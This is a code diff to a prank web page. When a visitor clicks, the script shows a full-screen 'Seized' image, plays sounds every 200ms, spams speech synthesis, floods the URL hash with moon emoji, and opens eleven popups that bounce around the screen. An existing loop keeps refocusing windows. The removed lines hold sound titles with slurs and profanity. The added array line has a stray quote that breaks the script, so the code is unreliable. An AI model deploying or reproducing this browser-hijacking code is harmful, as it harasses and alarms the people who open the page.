@@ -10,7 +10,12 @@
 <body>
     <img src="./seized.png" alt="Seized" style="width: 100%; height: 100vh; object-fit: fill; margin-top: -60px;" id="seized">
     <script>
+        function speak (phrase) {
+          if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
+          window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
+        }
         function YouAreCooked(){
+            
             // to change the image id seized every second with a random gif item from the array it will do it every second
             const gifs = [
                 "https://media2.giphy.com/media/v1.Y2lkPTZjMDliOTUyM2tucDF0YTVhcmQyc25wNzk3ZnRpd3lxZGNubTdlMmhuNDZ1cmVtdCZlcD12MV9naWZzX3NlYXJjaCZjdD1n/n6szplK2CnuJW/giphy.gif",
@@ -58,78 +63,10 @@
                 window[win].focus();
             }, 90);
             const soundUrls = [
-                "https://www.myinstants.com/media/sounds/full-bass-lvbel-c5.mp3",
-                "https://www.myinstants.com/media/sounds/anime-ahh.mp3",
-                "https://www.myinstants.com/media/sounds/fahhhhhhhhhhhhhh.mp3",
-                "https://www.myinstants.com/media/sounds/tm-reis-sen-tehlikesin.mp3",
-                "https://www.myinstants.com/media/sounds/ne-diyooo-oglum.mp3",
-                "https://www.myinstants.com/media/sounds/kurdish-50-cent.mp3",
-                "https://www.myinstants.com/media/sounds/kabede-hacilar-huu-der-allah_GbcvPX1.mp3",
-                "https://www.myinstants.com/media/sounds/zenciler-ismaili-pompaladi.mp3",
+                "https://www.myinstants.com/media/sounds/fahhhhhhhhhhhhhh.mp3",",
                 "https://www.myinstants.com/media/sounds/whatsapp-bass-boosted.mp3",
                 "https://www.myinstants.com/media/sounds/manifest.mp3",
-                "https://www.myinstants.com/media/sounds/gey.mp3",
-                "https://www.myinstants.com/media/sounds/sikecaaaam.mp3",
-                "https://www.myinstants.com/media/sounds/korna-tir.mp3",
-                "https://www.myinstants.com/media/sounds/keloglan-muhahahaha.mp3",
-                "https://www.myinstants.com/media/sounds/ramiz-dayi-alarm.mp3",
-                "https://www.myinstants.com/media/sounds/dc-sovus.mp3",
-                "https://www.myinstants.com/media/sounds/allahumme-yarab.mp3",
-                "https://www.myinstants.com/media/sounds/mesii.mp3",
-                "https://www.myinstants.com/media/sounds/yetersiz-bakiye-iett.mp3",
-                "https://www.myinstants.com/media/sounds/puu-kara-kopek-seni.mp3",
-                "https://www.myinstants.com/media/sounds/oi-oi-oe-oi-a-eye-eye.mp3",
-                "https://www.myinstants.com/media/sounds/kastamonu-taskopru-sarimsak-geldi.mp3",
-                "https://www.myinstants.com/media/sounds/anime-ah_4UL8Jae.mp3",
-                "https://www.myinstants.com/media/sounds/telefonum-caliyor.mp3",
-                "https://www.myinstants.com/media/sounds/afia-oil-zil-sesi_Gy3QZZZ.mp3",
-                "https://www.myinstants.com/media/sounds/vodka-vodka-belluga.mp3",
-                "https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3",
-                "https://www.myinstants.com/media/sounds/lo-siento-wilson.mp3",
-                "https://www.myinstants.com/media/sounds/bab-ayak.mp3",
-                "https://www.myinstants.com/media/sounds/fatih-sultan-mehmet.mp3",
-                "https://www.myinstants.com/media/sounds/dry-fart.mp3",
-                "https://www.myinstants.com/media/sounds/suriye-milli-marsi.mp3",
-                "https://www.myinstants.com/media/sounds/dexter-meme.mp3",
-                "https://www.myinstants.com/media/sounds/keloglan-jenerik-sesi-fulleyin.mp3",
-                "https://www.myinstants.com/media/sounds/askimin-cani-helva-cekmis.mp3",
-                "https://www.myinstants.com/media/sounds/uyansana-lan-izmarit.mp3",
-                "https://www.myinstants.com/media/sounds/15-temmuz-gecesi-savasan-yigitler.mp3",
-                "https://www.myinstants.com/media/sounds/ezi-kuzi-ciye-te.mp3",
-                "https://www.myinstants.com/media/sounds/emir-sovuss.mp3",
-                "https://www.myinstants.com/media/sounds/ahmet-ne-guluyon-lan-oc.mp3",
-                "https://www.myinstants.com/media/sounds/eyvah-tufan-eyvah-bass-boosted.mp3",
-                "https://www.myinstants.com/media/sounds/pupg-cagrisi.mp3",
-                "https://www.myinstants.com/media/sounds/lan-oglum-dur-amina.mp3",
-                "https://www.myinstants.com/media/sounds/ceddin-deden.mp3",
-                "https://www.myinstants.com/media/sounds/taklaci-guvercin.mp3",
-                "https://www.myinstants.com/media/sounds/erdoganin-gotkili.mp3",
-                "https://www.myinstants.com/media/sounds/among-us-role-reveal-sound.mp3",
-                "https://www.myinstants.com/media/sounds/goo-goo-gagaaa.mp3",
-                "https://www.myinstants.com/media/sounds/imam-ali-bashar.mp3",
-                "https://www.myinstants.com/media/sounds/rtee.mp3",
-                "https://www.myinstants.com/media/sounds/mahmut-seni-cok-seviyorum-dayi.mp3",
-                "https://www.myinstants.com/media/sounds/aykut-elmas-oc-geliyor.mp3",
-                "https://www.myinstants.com/media/sounds/lvbel-c5-gulus.mp3",
-                "https://www.myinstants.com/media/sounds/kabede-hacilar-100-bass-boosted.mp3",
-                "https://www.myinstants.com/media/sounds/p-rn-hub-intro-extreme-loud-cok-yuksek-ses.mp3",
-                "https://www.myinstants.com/media/sounds/pantolonlarim-yuktu.mp3",
-                "https://www.myinstants.com/media/sounds/vine-boom.mp3",
-                "https://www.myinstants.com/media/sounds/my-movie-6_0RlWMvM.mp3",
-                "https://www.myinstants.com/media/sounds/sonmez-reyiz-senin-anan-afrikal-zenciler-yamyamlar.mp3",
-                "https://www.myinstants.com/media/sounds/wanda-nara-ultra-boosted.mp3",
-                "https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-e-lutador.mp3",
-                "https://www.myinstants.com/media/sounds/n-ldhy-smtny-my-hydr.mp3",
-                "https://www.myinstants.com/media/sounds/imbo-otryzhka.mp3",
-                "https://www.myinstants.com/media/sounds/suuuu-alarm.mp3",
-                "https://www.myinstants.com/media/sounds/tir-editli-sarki.mp3",
-                "https://www.myinstants.com/media/sounds/deniz-abi-kornaya-bas.mp3",
-                "https://www.myinstants.com/media/sounds/icardi-bilmiyorum-diyor_cpCdxfp.mp3",
-                "https://www.myinstants.com/media/sounds/aglama-hadi-oyna.mp3",
-                "https://www.myinstants.com/media/sounds/hanimisigottimontisim.mp3",
-                "https://www.myinstants.com/media/sounds/lvbel-c5-remix.mp3",
-                "https://www.myinstants.com/media/sounds/sneaky-golem.mp3",
-                "https://www.myinstants.com/media/sounds/anavi-sikim.mp3"
+                "https://github.com/ivorydevrimoalt/schnitzel/raw/refs/heads/main/ouuuuuuuuuuuugh.wav"
             ];
 
             function playRandomSound() {
@@ -140,6 +77,70 @@
 
             // Triggers every 200ms (0.2 seconds)
             setInterval(playRandomSound, 200);
+            const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
+            let step = 0
+
+            speak("69 ".repeat(16))
+            
+            setInterval(() => {
+                let s = ''
+                // 10 is the number of moons
+                for (let i = 0; i < 50; i++) {
+                    // This math creates a "wave" effect based on the index (i)
+                    // Adjusting 'step' moves the wave forward
+                    const phase = Math.floor(Math.sin((step / 5) - (i / 2)) * 4 + 4)
+                    s += f[phase % 8]
+                }
+    
+                window.location.hash = s
+                step++
+            }, 70)
+
+            let popup;
+            let vx = 100; // Horizontal velocity
+            let vy = 300; // Vertical velocity
+
+            function spawnAndBounce() {
+                // 1. Open the popup (Width: 400, Height: 300)
+                popup = window.open('lol3.html', 'Bouncer', 'width=400,height=300');
+    
+                if (!popup) {
+                    alert("Popup blocked! Please allow popups for this site.");
+                    return;
+                }
+
+                popup.document.write("<h1>I'm Bouncing!</h1>");
+
+                // 2. Start the animation loop
+                setTimeout(function(){setInterval(() => {
+                    // Get current position and screen constraints
+                    const x = popup.screenX;
+                    const y = popup.screenY;
+                    const width = popup.outerWidth;
+                    const height = popup.outerHeight;
+
+                    const screenWidth = window.screen.availWidth;
+                    const screenHeight = window.screen.availHeight;
+
+                    // 3. Check for collisions with screen edges
+                    if (x <= 0 || x + width >= screenWidth) vx *= -1;
+                    if (y <= 0 || y + height >= screenHeight) vy *= -1;
+
+                    // 4. Move the window
+                    popup.moveBy(vx, vy);
+                }, 30)},1100);
+            }
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
+            spawnAndBounce()
         }
         document.addEventListener('click', function(){
             YouAreCooked();
